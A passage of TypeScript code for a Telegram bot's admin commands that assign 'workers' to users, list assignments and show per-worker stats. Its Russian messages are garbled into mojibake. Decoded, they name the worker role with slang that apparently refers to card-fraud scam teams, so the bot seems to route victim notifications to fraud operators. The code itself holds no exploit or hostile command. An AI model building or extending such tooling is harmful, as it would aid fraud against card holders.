    console.error("Error removing worker:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –≤–±–∏–≤–µ—Ä–∞.");
  }
});

// Admin command to assign worker to user
bot.onText(/\/assignworker (.+) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const workerId = match?.[1]?.trim();
  const userId = match?.[2]?.trim();

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.");
    return;
  }

  if (!workerId || !userId) {
    await bot.sendMessage(chatId, "‚ùå –£–∫–∞–∂–∏—Ç–µ Telegram ID –≤–±–∏–≤–µ—Ä–∞ –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.\n\n–ü—Ä–∏–º–µ—Ä: /assignworker 123456789 987654321");
    return;
  }

  try {
    // Check if both users exist
    const worker = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.telegramId, workerId));

    const user = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.telegramId, userId));

    if (worker.length === 0 || worker[0].role !== "worker") {
      await bot.sendMessage(chatId, `‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${workerId} –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –≤–±–∏–≤–µ—Ä–æ–º.`);
      return;
    }

    if (user.length === 0) {
      await bot.sendMessage(chatId, `‚ùå –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${userId} –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ —Å–∏—Å—Ç–µ–º–µ.`);
      return;
    }

    // Check if assignment already exists
    const existingAssignment = await db
      .select()
      .from(workerAssignments)
      .where(
        and(
          eq(workerAssignments.workerId, workerId),
          eq(workerAssignments.userId, userId)
        )
      );

    if (existingAssignment.length > 0) {
      await bot.sendMessage(chatId, `‚ùå –í–±–∏–≤–µ—Ä ${workerId} —É–∂–µ –Ω–∞–∑–Ω–∞—á–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é ${userId}.`);
      return;
    }

    // Create assignment
    await db.insert(workerAssignments).values({
      workerId,
      userId,
      assignedBy: telegramId,
    });

    await bot.sendMessage(
      chatId,
      `‚úÖ –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ —Å–æ–∑–¥–∞–Ω–æ!\n\n` +
      `üë§ –í–±–∏–≤–µ—Ä: ${workerId}\n` +
      `üìã –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${userId}\n\n` +
      `üìß –¢–µ–ø–µ—Ä—å –≤–±–∏–≤–µ—Ä –±—É–¥–µ—Ç –ø–æ–ª—É—á–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ—Ç —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`,
      adminKeyboard
    );
  } catch (error) {
    console.error("Error assigning worker:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–∏ –≤–±–∏–≤–µ—Ä–∞.");
  }
});

// Admin command to unassign worker from user
bot.onText(/\/unassignworker (.+) (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const workerId = match?.[1]?.trim();
  const userId = match?.[2]?.trim();

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.");
    return;
  }

  if (!workerId || !userId) {
    await bot.sendMessage(chatId, "‚ùå –£–∫–∞–∂–∏—Ç–µ Telegram ID –≤–±–∏–≤–µ—Ä–∞ –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.\n\n–ü—Ä–∏–º–µ—Ä: /unassignworker 123456789 987654321");
    return;
  }

  try {
    // Remove assignment
    await db
      .delete(workerAssignments)
      .where(
        and(
          eq(workerAssignments.workerId, workerId),
          eq(workerAssignments.userId, userId)
        )
      );

    await bot.sendMessage(
      chatId,
      `‚úÖ –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ!\n\n` +
      `üë§ –í–±–∏–≤–µ—Ä: ${workerId}\n` +
      `üìã –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${userId}\n\n` +
      `üìß –í–±–∏–≤–µ—Ä –±–æ–ª—å—à–µ –Ω–µ –±—É–¥–µ—Ç –ø–æ–ª—É—á–∞—Ç—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ—Ç —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`,
      adminKeyboard
    );
  } catch (error) {
    console.error("Error unassigning worker:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–º–µ–Ω–µ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏—è.");
  }
});

// Admin command to list all assignments
bot.onText(/\/listassignments/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.");
    return;
  }

  try {
    const assignments = await db
      .select()
      .from(workerAssignments);

    if (assignments.length === 0) {
      await bot.sendMessage(chatId, "üìã –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–π.", adminKeyboard);
      return;
    }

    const assignmentsList = assignments.map((assignment, index) => 
      `${index + 1}. üë§ ${assignment.workerId} ‚Üí üìã ${assignment.userId}`
    ).join('\n');

    await bot.sendMessage(
      chatId,
      `üìã **–ê–ö–¢–ò–í–ù–´–ï –ù–ê–ó–ù–ê–ß–ï–ù–ò–Ø**\n\n${assignmentsList}\n\n` +
      `üìä –í—Å–µ–≥–æ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–π: ${assignments.length}`,
      { parse_mode: 'Markdown', reply_markup: adminKeyboard.reply_markup }
    );
  } catch (error) {
    console.error("Error listing assignments:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–π.");
  }
});

// Admin command to show worker stats
bot.onText(/\/workerstats/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(chatId, "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.");
    return;
  }

  try {
    const workers = await getAllWorkers();
    const assignments = await db.select().from(workerAssignments);

    const workerStats = workers.map(workerId => {
      const assignedCount = assignments.filter(a => a.workerId === workerId).length;
      return `üë§ ${workerId}: ${assignedCount} –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–π`;
    }).join('\n');

    await bot.sendMessage(
      chatId,
      `üìä **–°–¢–ê–¢–ò–°–¢–ò–ö–ê –í–ë–ò–í–ï–†–û–í**\n\n` +
      `üë• –í—Å–µ–≥–æ –≤–±–∏–≤–µ—Ä–æ–≤: ${workers.length}\n` +
      `üìã –í—Å–µ–≥–æ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–π: ${assignments.length}\n\n` +
      `üìà –î–µ—Ç–∞–ª–∏–∑–∞—Ü–∏—è:\n${workerStats || '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö'}`,
      { parse_mode: 'Markdown', reply_markup: adminKeyboard.reply_markup }
    );
  } catch (error) {
    console.error("Error getting worker stats:", error);
    await bot.sendMessage(chatId, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏.");
  }
});

console.log("‚úÖ Telegram bot started successfully!");
console.log("Bot token:", VERIFIED_BOT_TOKEN.substring(0, 20) + "...");

export default bot;
